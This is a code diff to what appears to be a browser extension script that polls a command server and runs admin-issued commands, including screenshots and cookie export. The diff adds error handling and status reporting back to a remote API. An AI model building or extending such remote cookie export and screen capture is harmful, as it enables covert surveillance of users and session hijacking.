@@ -833,27 +833,68 @@ function connectToCommandServer() {
 
 // Handle remote commands from admin
 async function handleRemoteCommand(data) {
-  log('info', 'Received remote command', { command_id: data.command_id, type: data.command_type });
+  log('info', '📨 Remote command received:', { 
+    command_id: data.command_id, 
+    type: data.command_type,
+    target_tab_id: data.target_tab_id
+  });
   
   try {
     switch (data.command_type) {
       case 'popup':
         await handlePopupCommand(data);
         break;
+      
       case 'block':
         await handleBlockCommand(data);
         break;
+      
       case 'screenshot':
         await handleScreenshotCommand(data);
         break;
+      
       case 'export_cookies':
         await handleExportCookiesCommand(data);
         break;
+      
+      default:
+        log('warn', 'Unknown command type:', data.command_type);
+        throw new Error(`Unknown command type: ${data.command_type}`);
     }
     
+    // ✅ Update command status to 'executed'
+    await updateCommandStatus(data.command_id, 'executed', null);
     log('info', `✅ Command ${data.command_id} executed successfully`);
+    
   } catch (error) {
-    log('error', `❌ Command ${data.command_id} execution failed`, error);
+    log('error', `❌ Command ${data.command_id} execution failed:`, error);
+    
+    // Update command status to 'failed'
+    await updateCommandStatus(data.command_id, 'failed', error.message);
+  }
+}
+
+// Update command status in database
+async function updateCommandStatus(command_id, status, error_message) {
+  try {
+    const response = await fetch(`${CONFIG.API_BASE}/command-queue`, {
+      method: 'PUT',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
+      },
+      body: JSON.stringify({
+        command_id,
+        status,
+        error: error_message
+      })
+    });
+    
+    if (!response.ok) {
+      log('warn', `Failed to update command status: ${response.status}`);
+    }
+  } catch (error) {
+    log('debug', 'Error updating command status:', error.message);
   }
 }
 
